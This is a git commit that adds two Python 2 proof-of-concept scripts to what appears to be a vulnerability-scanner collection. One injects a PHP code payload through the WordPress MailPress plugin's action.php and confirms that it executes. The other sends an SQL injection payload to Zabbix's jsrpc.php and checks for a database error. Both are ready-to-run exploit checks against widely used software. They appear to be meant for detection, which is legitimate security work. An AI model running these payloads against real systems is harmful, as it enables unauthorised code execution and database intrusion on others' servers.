35062f12192c4f8066c01b168df5fae98e8e6ddd
flyl3una <fly_luna@outlook.com>
2017-05-22 00:01:33 +0800

    over

---
+++ tools/setting/poc/web/wordpress/20170422165230_9.py
@@ -0,0 +1,34 @@
+#coding:utf-8
+
+
+import urllib2
+import sys
+import re
+
+def audit(host):
+    target = host+"/wp-content/plugins/mailpress/mp-includes/action.php"
+    post_data = "action=autosave&id=0&revision=-1&toemail=&toname=&fromemail=&fromname=&to_list=1&Theme=&subject=<?php phpinfo();?>"\
+        + "&html=&plaintext=&mail_format=standard&autosave=1"
+    content = urllib2.urlopen(url=target, data=post_data).read()
+    # print content
+    regex = r"(autosave id=['\"])(\d+)(['\"])"
+    m = re.search(regex, content)    
+    if not m:
+        print '[FAILS]'
+        return
+    id = m.group(2)
+    # print id
+    target1 = host + "/wp-content/plugins/mailpress/mp-includes/action.php?action=iview&id=%s" % id
+    content1 = urllib2.urlopen(url=target1).read()
+    if content1.lower().index('php') != -1:
+        print '[SUCCESS]'
+    else:
+        print '[FAILS]'
+    
+
+if __name__ == '__main__':
+    if len(sys.argv) != 2:
+        print '[PARAM]'
+    else:
+        audit(sys.argv[1])
+    
---
+++ tools/setting/poc/web/zabbix/20170422165559_63.py
@@ -0,0 +1,21 @@
+#coding:utf-8
+
+import sys, urllib2
+
+
+def audit():
+    pass
+
+if __name__ == '__main__':
+    if len(sys.argv) == 2:
+        host = sys.argv[1]
+    else:
+        print '[PARAMERROR]'
+    target = host+"/jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=2'3297&updateProfile=true&screenitemid=&period=3600&stime=20160817050632&resourcetype=17&itemids%5B23297%5D=23297&action=showlatest&filter=&filter_task=&mark_color=1"
+    content = urllib2.urlopen(url=target).read()
+    # print content
+    if content.index('You have an error in your SQL syntax') != -1:
+        print '[SUCCESS]'
+    else:
+        print '[FAILS]'
+
